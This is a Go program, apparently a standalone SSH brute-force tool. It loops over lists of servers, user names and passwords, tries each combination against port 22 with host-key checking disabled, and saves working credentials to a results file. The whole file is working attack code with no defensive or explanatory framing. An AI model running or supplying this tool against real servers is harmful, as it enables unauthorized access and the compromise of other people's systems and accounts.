package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

var timer = flag.Duration("timer", 300*time.Millisecond, "ssh dial response (ex:300ms)")

func password_brute(server string, user string) bool {
	passwords_txt, err := os.Open("lists/passwords.txt")

	if err != nil {
		log.Fatal(err)
	}
	defer passwords_txt.Close()
	passwords := bufio.NewScanner(passwords_txt)
	passwords.Split(bufio.ScanWords)
	for passwords.Scan() {
		result := connect(server, user, passwords.Text())
		if result == true {
			return true
		}
	}
	return false
}

func user_brute(server string) {
	users_txt, err := os.Open("lists/users.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer users_txt.Close()
	users := bufio.NewScanner(users_txt)
	users.Split(bufio.ScanWords)
	for users.Scan() {
		result := password_brute(server, users.Text())
		if result == true {
			break
		}
	}
}

func scanner() {
	servers_txt, err := os.Open("lists/servers.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer servers_txt.Close()
	servers := bufio.NewScanner(servers_txt)
	servers.Split(bufio.ScanWords)
	for servers.Scan() {
		user_brute(servers.Text())
	}
}

func connect(server string, user string, pass string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         *timer,
	}

	conn, err := ssh.Dial("tcp", server+":22", config)
	if err != nil {
		fmt.Println("Wrong!", server, user, pass)
		return false
	} else {
		fmt.Println("Pattern Found:", server, user, pass)
		append_results(server, user, pass)
		conn.Close()
		return true
	}
}

func append_results(server string, user string, pass string) {

	f, err := os.OpenFile("results.txt", os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	f.WriteString(server + "|||" + user + "|||" + pass + "\n")
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	scanner()

}
